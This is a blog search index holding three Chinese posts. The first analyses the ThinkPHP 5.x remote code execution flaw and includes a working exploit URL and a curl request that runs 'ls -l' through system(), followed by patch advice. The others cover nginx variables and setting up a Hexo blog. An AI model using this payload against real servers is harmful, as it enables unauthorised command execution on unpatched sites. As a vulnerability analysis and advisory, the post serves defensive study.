<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ThinkPHP 5.x 远程代码getshell漏洞</title>
      <link href="/2018/12/26/ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81getshell%E6%BC%8F%E6%B4%9E/"/>
      <url>/2018/12/26/ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81getshell%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="ThinkPHP-简介"><a href="#ThinkPHP-简介" class="headerlink" title="ThinkPHP 简介"></a>ThinkPHP 简介</h2><p>ThinkPHP 是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，因为其易用性、扩展性，已经成长为国内颇具影响力的WEB应用开发框架</p><h2 id="漏洞解析"><a href="#漏洞解析" class="headerlink" title="漏洞解析"></a>漏洞解析</h2><p>漏洞引发的原因是框架对控制器名没有进行足够的检测，现拉取ThinkPHP v5.0.22 来进行测试</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">请求路由</span><br><span class="line">    =&gt; http://127.0.0.1/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l</span><br><span class="line">系统解析为</span><br><span class="line">    =&gt; 模块：index</span><br><span class="line">    =&gt; 控制器：\think\app</span><br><span class="line">    =&gt; 方法：invokefunction</span><br><span class="line">    =&gt; 参数列表：</span><br><span class="line">    =&gt; function=call_user_func_array</span><br><span class="line">    =&gt; vars[0]=system</span><br><span class="line">    =&gt; vars[1][]=ls%20-l</span><br></pre></td></tr></table></figure><p>跟踪到路由解析代码 \thinkphp\library\think\App.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 执行模块</span><br><span class="line"> * @access public</span><br><span class="line"> * @param array $result  模块/控制器/操作</span><br><span class="line"> * @param array $config  配置参数</span><br><span class="line"> * @param bool  $convert 是否自动转换控制器和操作名</span><br><span class="line"> * @return mixed</span><br><span class="line"> * @throws HttpException</span><br><span class="line"> */</span><br><span class="line">public static function module($result, $config, $convert = null)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    // ======================================================</span><br><span class="line">    // 未进行过滤直接以 / 分解来进行解析</span><br><span class="line">    // ======================================================</span><br><span class="line">    if (is_string($result)) &#123;</span><br><span class="line">        $result = explode(&apos;/&apos;, $result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    // ======================================================</span><br><span class="line">    // 未进行过滤直接赋值为 $result[1] 即 \think\app 并进行实例化</span><br><span class="line">    // ======================================================</span><br><span class="line">    $instance = Loader::controller(</span><br><span class="line">        $controller,                      // \think\app</span><br><span class="line">        $config[&apos;url_controller_layer&apos;], </span><br><span class="line">        $config[&apos;controller_suffix&apos;],</span><br><span class="line">        $config[&apos;empty_controller&apos;]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    // =========================================</span><br><span class="line">    // 传递 $result[2] 即 invokefunction 方法</span><br><span class="line">    // is_callable([$instance, &quot;invokefunction&quot;]</span><br><span class="line">    // =========================================</span><br><span class="line">    if (is_callable([$instance, $action])) &#123;  </span><br><span class="line">        // 执行操作方法</span><br><span class="line">        $call = [$instance, $action];</span><br><span class="line">        // 严格获取当前操作方法名</span><br><span class="line">        $reflect    = new \ReflectionMethod($instance, $action);</span><br><span class="line">        $methodName = $reflect-&gt;getName();</span><br><span class="line">        $suffix     = $config[&apos;action_suffix&apos;];</span><br><span class="line">        $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName;</span><br><span class="line">        $request-&gt;action($actionName);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    return self::invokeMethod($call, $vars);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 调用反射执行类的方法 支持参数绑定</span><br><span class="line"> * @access public</span><br><span class="line"> * @param string|array $method 方法</span><br><span class="line"> * @param array        $vars   变量</span><br><span class="line"> * @return mixed</span><br><span class="line"> */</span><br><span class="line">public static function invokeMethod($method, $vars = [])</span><br><span class="line">&#123;</span><br><span class="line">    if (is_array($method)) &#123;</span><br><span class="line">        $class   = is_object($method[0]) ? $method[0] : self::invokeClass($method[0]);</span><br><span class="line">        $reflect = new \ReflectionMethod($class, $method[1]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 静态方法</span><br><span class="line">        $reflect = new \ReflectionMethod($method);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $args = self::bindParams($reflect, $vars);</span><br><span class="line">    // ===============================================</span><br><span class="line">    // 传递uri参数</span><br><span class="line">    // var_dump($args);</span><br><span class="line">    // --------------------------</span><br><span class="line">    // array(2) &#123;</span><br><span class="line">    //   [0]=&gt;</span><br><span class="line">    //   string(20) &quot;call_user_func_array&quot;</span><br><span class="line">    //   [1]=&gt;</span><br><span class="line">    //   array(2) &#123;</span><br><span class="line">    //     [0]=&gt;</span><br><span class="line">    //     string(6) &quot;system&quot;</span><br><span class="line">    //     [1]=&gt;</span><br><span class="line">    //     array(1) &#123;</span><br><span class="line">    //       [0]=&gt;</span><br><span class="line">    //       string(5) &quot;ls -l&quot;</span><br><span class="line">    //     &#125;</span><br><span class="line">    //   &#125;</span><br><span class="line">    // &#125;</span><br><span class="line">    // ===============================================</span><br><span class="line">    self::$debug &amp;&amp; Log::record(&apos;[ RUN ] &apos; . $reflect-&gt;class . &apos;-&gt;&apos; . $reflect-&gt;name . &apos;[ &apos; . $reflect-&gt;getFileName() . &apos; ]&apos;, &apos;info&apos;);</span><br><span class="line"></span><br><span class="line">    // =======================================================</span><br><span class="line">    // 即通过 invokeFunction 传递系统调用给 call_user_func_array</span><br><span class="line">    // 从而调用 system(&quot;ls -l&quot;)</span><br><span class="line">    // =======================================================</span><br><span class="line">    return $reflect-&gt;invokeArgs(isset($class) ? $class : null, $args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 执行函数或者闭包方法 支持参数调用</span><br><span class="line"> * @access public</span><br><span class="line"> * @param string|array|\Closure $function 函数或者闭包</span><br><span class="line"> * @param array                 $vars     变量</span><br><span class="line"> * @return mixed</span><br><span class="line"> */</span><br><span class="line">public static function invokeFunction($function, $vars = [])</span><br><span class="line">&#123;</span><br><span class="line">    $reflect = new \ReflectionFunction($function);</span><br><span class="line">    $args    = self::bindParams($reflect, $vars);</span><br><span class="line"></span><br><span class="line">    // 记录执行信息</span><br><span class="line">    self::$debug &amp;&amp; Log::record(&apos;[ RUN ] &apos; . $reflect-&gt;__toString(), &apos;info&apos;);</span><br><span class="line"></span><br><span class="line">    return $reflect-&gt;invokeArgs($args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">漏洞测试结果</span><br><span class="line"></span><br><span class="line"># curl &quot;http://127.0.0.1/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l&quot;</span><br><span class="line">total 13</span><br><span class="line">-rw-r--r-- 1 pc-user 197121 850 Sep  7 21:33 favicon.ico</span><br><span class="line">-rw-r--r-- 1 pc-user 197121 766 Sep  7 21:33 index.php</span><br><span class="line">-rw-r--r-- 1 pc-user 197121  24 Sep  7 21:33 robots.txt</span><br><span class="line">-rw-r--r-- 1 pc-user 197121 840 Sep  7 21:33 router.php</span><br><span class="line">drwxr-xr-x 1 pc-user 197121   0 Dec 26 22:18 static</span><br></pre></td></tr></table></figure><h2 id="受影响版本范围"><a href="#受影响版本范围" class="headerlink" title="受影响版本范围"></a>受影响版本范围</h2><p>ThinkPHP 5.0.x &lt; 5.0.23<br>ThinkPHP 5.1.x &lt; 5.1.31</p><p>大家看一下相关链接中github版本列表，参考github release列表的更新内容，选择对自己升级影响最小的，最好的话就是直接升级到最新版本，要想不受漏洞影响，至少应该升级为<br>ThinkPHP 5.0.23<br>ThinkPHP 5.1.31<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">composer require topthink/framework=v5.0.23</span><br><span class="line">composer require topthink/framework=v5.1.31</span><br><span class="line"></span><br><span class="line">升级后确认版本已更新</span><br><span class="line"># composer show topthink/framework</span><br><span class="line"></span><br><span class="line">name     : topthink/framework</span><br><span class="line">descrip. : the new thinkphp framework</span><br><span class="line">keywords : framework, orm, thinkphp</span><br><span class="line">versions : * v5.0.23</span><br><span class="line">type     : think-framework</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a href="https://packagist.org/packages/topthink/framework" target="_blank" rel="noopener">ThinkPHP composer包列表(composer 可以拉取的版本列表)</a><br><a href="https://github.com/top-think/think/releases" target="_blank" rel="noopener">ThinkPHP github版本列表(更新内容说明参考)</a><br><a href="https://blog.thinkphp.cn/869075" target="_blank" rel="noopener">ThinkPHP 官方漏洞说明</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>nginx配置总结</title>
      <link href="/2018/12/03/nginx%E9%85%8D%E7%BD%AE%E6%80%BB%E7%BB%93/"/>
      <url>/2018/12/03/nginx%E9%85%8D%E7%BD%AE%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>平时使用nginx的过程发现有很多零碎的东西在网上很难查看，因此总结归纳一下，主要列举了nginx常用的变量和围绕一些知识点展示用例。<br><a id="more"></a></p><h3 id="nginx-全局变量"><a href="#nginx-全局变量" class="headerlink" title="nginx 全局变量"></a>nginx 全局变量</h3><p>请求http报文如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Request URL: http://www.test1.com/?test_var=123&amp;test_var2=456</span><br><span class="line">Request Method: POST</span><br><span class="line">Status Code: 200 OK</span><br><span class="line">Remote Address: 127.0.0.1:80</span><br><span class="line">Referrer Policy: no-referrer-when-downgrade</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Origin: http://www.test.com</span><br><span class="line">Referer: http://www.test.com/test.html</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36</span><br><span class="line"></span><br><span class="line">post_test_var=789&amp;POst_test_var1=101112</span><br></pre></td></tr></table></figure></p><p>nginx全局变量列举：</p><table><thead><tr><th>变量</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td>$remote_addr</td><td>127.0.0.1</td><td>客户端IP地址；</td></tr><tr><td>$http_origin</td><td><a href="http://www.test.com" target="_blank" rel="noopener">http://www.test.com</a></td><td>HOST；</td></tr><tr><td>$http_referer</td><td><a href="http://www.test.com/test.html" target="_blank" rel="noopener">http://www.test.com/test.html</a></td><td>origin源；</td></tr><tr><td>$http_host</td><td><a href="http://www.test1.com" target="_blank" rel="noopener">www.test1.com</a></td><td>Referer；</td></tr><tr><td>$args</td><td>test_var=123&amp;test_var2=456</td><td>#这个变量等于请求行中的参数，同$query_string</td></tr><tr><td>$content_length</td><td>39</td><td>请求头中的Content-length字段。</td></tr><tr><td>$content_type</td><td>application/x-www-form-urlencoded; charset=UTF-8</td><td>请求头中的Content-Type字段。</td></tr><tr><td>$document_root</td><td>D:/phpStudy/WWW</td><td>当前请求在root指令中指定的值。</td></tr><tr><td>$host</td><td><a href="http://www.test1.com" target="_blank" rel="noopener">www.test1.com</a></td><td>请求主机头字段，否则为服务器名称。</td></tr><tr><td>$http_user_agent</td><td>http_user_agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.</td><td>客户端agent信息</td></tr><tr><td>$http_cookie</td><td></td><td>客户端cookie信息</td></tr><tr><td>$limit_rate</td><td>0</td><td>这个变量可以限制连接速率。</td></tr><tr><td>$request_method</td><td>POST</td><td>客户端请求的动作，通常为GET或POST。</td></tr><tr><td>$remote_addr</td><td>127.0.0.1</td><td>客户端的IP地址。</td></tr><tr><td>$remote_port</td><td>65002</td><td>客户端的端口。</td></tr><tr><td>$remote_user</td><td></td><td>已经经过Auth Basic Module验证的用户名。</td></tr><tr><td>$request_filename</td><td>D:/phpStudy/WWW/</td><td>当前请求的文件路径，由root或alias指令与URI请求生成。</td></tr><tr><td>$scheme</td><td>http</td><td>HTTP方法（如http，https）。</td></tr><tr><td>$server_protocol</td><td>HTTP/1.1</td><td>请求使用的协议，通常是HTTP/1.0或HTTP/1.1。</td></tr><tr><td>$server_addr</td><td>127.0.0.1</td><td>服务器地址，在完成一次系统调用后可以确定这个值。</td></tr><tr><td>$server_name</td><td><a href="http://www.test1.com" target="_blank" rel="noopener">www.test1.com</a></td><td>服务器名称。</td></tr><tr><td>$server_port</td><td>80</td><td>请求到达服务器的端口号。</td></tr><tr><td>$request_uri</td><td>/?test_var=123&amp;test_var2=456</td><td>包含请求参数的原始URI，不包含主机名，如 ”/foo/bar.php?arg=baz”。</td></tr><tr><td>$uri</td><td>/</td><td>不带请求参数的当前URI，$uri不包含主机名，如”/foo/bar.html”。</td></tr><tr><td>$document_uri</td><td>/</td><td>与$uri相同。</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客搭建教程</title>
      <link href="/2018/11/08/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"/>
      <url>/2018/11/08/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>这篇博文介绍了我在搭建Hexo+Next主题时遇到的各种需要处理的问题。博客使用过程中也会继续不断完善。</p><a id="more"></a><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ hexo -v</span><br><span class="line">hexo: 3.8.0</span><br><span class="line">hexo-cli: 1.1.0</span><br><span class="line">os: Windows_NT 10.0.17134 win32 x64</span><br><span class="line">node: 8.9.3</span><br><span class="line">http_parser: 2.7.0</span><br><span class="line">v8: 6.1.534.48</span><br><span class="line">uv: 1.15.0</span><br><span class="line">zlib: 1.2.11</span><br><span class="line">ares: 1.10.1-DEV</span><br><span class="line">modules: 57</span><br><span class="line">nghttp2: 1.25.0</span><br><span class="line">openssl: 1.0.2n</span><br><span class="line">icu: 59.1</span><br><span class="line">unicode: 9.0</span><br><span class="line">cldr: 31.0.1</span><br><span class="line">tz: 2017b</span><br></pre></td></tr></table></figure><p><br></p><h2 id="评论"><a href="#评论" class="headerlink" title="评论"></a>评论</h2><p><a href="http://theme-next.iissnan.com/third-party-services.html#livere" target="_blank" rel="noopener">第三方集成服务-来必力</a><br>Next主题自带，这里我使用的是 <a href="https://www.livere.com/" target="_blank" rel="noopener">来必力</a>，注册后获取 LiveRe UID，直接改主题配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">livere_uid: #your livere_uid</span><br></pre></td></tr></table></figure></p><p>如果无法注册请科学上网，注册时会显示一堆韩文，大致意思是去邮箱看验证码<br>注册完登录选择 city 服务，然后进入<a href="https://www.livere.com/insight/myCode" target="_blank" rel="noopener">授权码页</a>复制以下 data-uid<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 来必力City版安装代码 --&gt;</span><br><span class="line">&lt;div id=&quot;lv-container&quot; data-id=&quot;city&quot; data-uid=&quot;********&quot;&gt;</span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="统计"><a href="#统计" class="headerlink" title="统计"></a>统计</h2><p><a href="http://theme-next.iissnan.com/third-party-services.html#analytics-busuanzi" target="_blank" rel="noopener">第三方集成服务-不蒜子统计</a><br><a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">不蒜子统计官网</a><br>Next主题自带，这里我使用的是 不蒜子统计，直接改主题配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">busuanzi_count:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure></p><h3 id="统计显示异常"><a href="#统计显示异常" class="headerlink" title="统计显示异常"></a>统计显示异常</h3><p>deploy博客后发现统计显示异常，调试后发现不蒜子的JS 404 加载不出来了。到官网看了一下，原来旧域名过期。</p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>1）找到NexT下引用不蒜子统计的文件。路径为/theme/next/layout/_third-party/analytics/busuanzi-counter.swig<br>2）替换js链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">将</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;busuanzi-count&quot;&gt;</span><br><span class="line">  &lt;script async src=&quot;https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">替换为</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;busuanzi-count&quot;&gt;</span><br><span class="line">  &lt;script async src=&quot;https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><p>Next主题自带有hexo-generator-search插件<br>直接在主题配置文件themes/next/_config.yml下修改配置即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="图片资源文件引入"><a href="#图片资源文件引入" class="headerlink" title="图片资源文件引入"></a>图片资源文件引入</h2><h3 id="source-资源文件夹（类似于全局）"><a href="#source-资源文件夹（类似于全局）" class="headerlink" title="source 资源文件夹（类似于全局）"></a>source 资源文件夹（类似于全局）</h3><p>对于少量或者公用的文件，可以存放在source资源文件夹<br>例如 source/images/test.jpg<br>通过 <code>![](/images/test.jpg)</code> 来访问它们<br><img src="/images/test.jpg" alt="source/images/test.jpg"></p><p><br></p><h3 id="文章资源文件夹（按文章分类）"><a href="#文章资源文件夹（按文章分类）" class="headerlink" title="文章资源文件夹（按文章分类）"></a>文章资源文件夹（按文章分类）</h3><h4 id="修改配置文件-config-yml"><a href="#修改配置文件-config-yml" class="headerlink" title="修改配置文件 _config.yml"></a>修改配置文件 _config.yml</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_asset_folder: true</span><br></pre></td></tr></table></figure><p>资源文件管理功能打开后，每次创建新文章都会自动创建一个资源文件夹。</p><h4 id="相对路径引用"><a href="#相对路径引用" class="headerlink" title="相对路径引用"></a>相对路径引用</h4><p>例如 _posts/post_name/img/test.jpg<br>通过 <code>![](./img/test.jpg)</code> 来访问它们<br><img src="./img/test.jpg" alt="./img/test.jpg"></p><p><br></p><h3 id="CDN引用"><a href="#CDN引用" class="headerlink" title="CDN引用"></a>CDN引用</h3><p>除了在本地存储图片，还可以将图片上传到一些免费的CDN服务中。将生成的地址直接拿来引用即可。<br><code>![](https://nodejs.org/static/images/logo.svg)</code><br><img src="https://nodejs.org/static/images/logo.svg" alt="CDN引用"></p><p><br></p><h2 id="没有标签页、分类页"><a href="#没有标签页、分类页" class="headerlink" title="没有标签页、分类页"></a>没有标签页、分类页</h2><h3 id="没有标签页，tags-404"><a href="#没有标签页，tags-404" class="headerlink" title="没有标签页，tags 404"></a>没有标签页，tags 404</h3><p>每篇博文都可以设置对应的标签<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: hexo博客搭建教程</span><br><span class="line">date: 2018-11-08 10:04:36</span><br><span class="line">tags: hexo</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><p>调用以下命令生成标签页<br>$ hexo new page tags</p><p>编辑主题配置文件，将tags添加到目录menu<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: /</span><br><span class="line">  archives: /archives</span><br><span class="line">  tags: /tags</span><br></pre></td></tr></table></figure></p><h4 id="使用多个标签"><a href="#使用多个标签" class="headerlink" title="使用多个标签"></a>使用多个标签</h4><p>标签的设置可以使用<a href="http://zh.wikipedia.org/zh-hant/YAML" target="_blank" rel="noopener">YAML语法</a><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: hexo博客搭建教程</span><br><span class="line">date: 2018-11-08 10:04:36</span><br><span class="line">tags: </span><br><span class="line">    - 标签1</span><br><span class="line">    - 标签2</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="没有分类页，categories-404"><a href="#没有分类页，categories-404" class="headerlink" title="没有分类页，categories 404"></a>没有分类页，categories 404</h3><p>给文章设置分类<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">categories:</span><br><span class="line">  - 一级分类</span><br><span class="line">  - 二级分类</span><br><span class="line">  - 三级分类</span><br><span class="line">  - ...</span><br></pre></td></tr></table></figure></p><p>调用以下命令生成分类页<br>$ hexo new page categories</p><p>编辑主题配置文件，将tags添加到目录menu<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: /</span><br><span class="line">  categories: /categories/</span><br><span class="line">  archives: /archives/</span><br><span class="line">  tags: /tags/</span><br></pre></td></tr></table></figure></p><h4 id="使用多级分类"><a href="#使用多级分类" class="headerlink" title="使用多级分类"></a>使用多级分类</h4><p>使用<a href="http://zh.wikipedia.org/zh-hant/YAML" target="_blank" rel="noopener">YAML语法</a><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: hexo博客搭建教程</span><br><span class="line">date: 2018-11-08 10:04:36</span><br><span class="line">categories:</span><br><span class="line">  - 一级分类</span><br><span class="line">  - 二级分类</span><br><span class="line">  - 三级分类</span><br><span class="line">  - ...</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><p><br></p><h2 id="首页只显示文章摘要"><a href="#首页只显示文章摘要" class="headerlink" title="首页只显示文章摘要"></a>首页只显示文章摘要</h2><h3 id="自动截取摘要"><a href="#自动截取摘要" class="headerlink" title="自动截取摘要"></a>自动截取摘要</h3><p>在主题配置文件设置 <code>enable:true</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Automatically Excerpt. Not recommend.</span><br><span class="line"># Please use &lt;!-- more --&gt; in the post to control excerpt accurately.</span><br><span class="line">auto_excerpt:</span><br><span class="line">  enable: false</span><br><span class="line">  length: 150</span><br></pre></td></tr></table></figure></p><p>但是这样子设置后，截取的摘要是纯文本，会很难看</p><h3 id="手动设置摘要"><a href="#手动设置摘要" class="headerlink" title="手动设置摘要"></a>手动设置摘要</h3><p>可以在每篇文章内使用标签<code>&lt;!-- more --&gt;</code>来手动设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: hexo博客搭建教程</span><br><span class="line">date: 2018-11-08 10:04:36</span><br><span class="line">tags: </span><br><span class="line">  - hexo</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">摘要内容</span><br><span class="line"></span><br><span class="line">&lt;!-- more --&gt;</span><br><span class="line"></span><br><span 